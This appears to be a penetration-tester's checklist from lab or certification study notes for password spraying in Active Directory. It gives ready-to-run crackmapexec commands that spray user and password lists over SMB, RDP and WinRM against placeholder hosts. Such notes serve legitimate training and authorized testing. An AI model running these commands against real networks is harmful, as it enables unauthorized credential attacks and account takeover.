> Remember to try credentials on EVERY SINGLE LOGIN even if crackmapexec doesn't offer it, try it manually.

- [ ] Ensure `crackmapexec` is using most updated version on your Kali Machine
```
https://github.com/mpgn/CrackMapExec
```
- Download latest version if needed

- [ ] Spray password list against AD user list using `crackmapexec` via SMB on your Kali Machine
```
crackmapexec smb 172.16.yyy.yyy 172.16.zzz.zzz -u user_list.txt -p password_list.txt -d hentaidomain.com --continue-on-success
```

- [ ] Spray password list against AD user list using `crackmapexec` via RDP on your Kali Machine
```
crackmapexec rdp 172.16.yyy.yyy 172.16.zzz.zzz -u user_list.txt -p password_list.txt -d hentaidomain.com --continue-on-success
```

- [ ] Spray password list against AD user list using `crackmapexec` via WinRM on your Kali Machine
```
crackmapexec winrm 172.16.yyy.yyy 172.16.zzz.zzz -u user_list.txt -p password_list.txt -d hentaidomain.com --continue-on-success
```